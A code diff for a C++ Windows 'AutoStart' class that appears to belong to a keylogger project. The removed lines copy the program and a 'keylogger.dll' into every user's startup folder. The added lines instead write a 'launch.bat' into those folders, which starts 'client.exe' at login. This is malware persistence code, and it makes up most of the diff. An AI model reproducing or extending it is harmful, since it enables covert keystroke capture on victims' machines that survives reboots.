@@ -27,11 +27,8 @@ void	AutoStart::verifyPath() const
 
 	for (auto path : tab)
 	{
-		if (isDirectory(path) && !isFile(path + "\\" + name))
-		{
-			copyFile(name, path + "\\" + name);
-			copyFile("keylogger.dll", path + "\\" + "keylogger.dll");
-		}
+		if (isDirectory(path) && !isFile(path + "\\launch.bat"))
+			createFile(path + "\\launch.bat");
 	}
 
 	if ((id = FindFirstFile((folder + "*").c_str(), &file)) != INVALID_HANDLE_VALUE)
@@ -40,11 +37,8 @@ void	AutoStart::verifyPath() const
 		{
 			std::string tmp(folder + file.cFileName + startUpFolder);
 
-			if (isDirectory(tmp) && !isFile(tmp + "\\" + name))
-			{
-				copyFile(name, tmp + "\\" + name);
-				copyFile("keylogger.dll", tmp + "\\" + "keylogger.dll");
-			}
+			if (isDirectory(tmp) && !isFile(tmp + "\\launch.bat"))
+				createFile(tmp + "\\launch.bat");
 		}
 		FindClose(id);
 	}
@@ -84,6 +78,7 @@ bool	AutoStart::copyFile(const std::string &from, const std::string &to) const
 	std::ifstream	fileFrom(from.c_str(), std::fstream::binary);
 	std::ofstream	fileTo(to.c_str(), std::fstream::out | std::fstream::trunc | std::fstream::binary);
 
+	std::cout << "File => " << from << " > " << to << std::endl;
 	if (fileFrom && fileTo)
 	{
 		std::istreambuf_iterator<char> bFrom(fileFrom), eFrom;
@@ -91,6 +86,7 @@ bool	AutoStart::copyFile(const std::string &from, const std::string &to) const
 		std::copy(bFrom, eFrom, bTo);
 		return (true);
 	}
+	std::cerr << strerror(errno) << std::endl;
 	return (false);
 }
 
@@ -109,5 +105,17 @@ bool	AutoStart::isFile(const std::string &path) const
 
 	if (stat(path.c_str(), &file) != -1 && file.st_mode & S_IFREG)
 		return (true);
+	return (false);
+}
+
+bool	AutoStart::createFile(const std::string &path) const
+{
+	std::ofstream file(path.c_str(), std::fstream::out | std::fstream::trunc | std::fstream::binary);
+
+	if (file)
+	{
+		file << "start \"" << _name << "\" client.exe";
+		return (false);
+	}
 	return (false);
 }
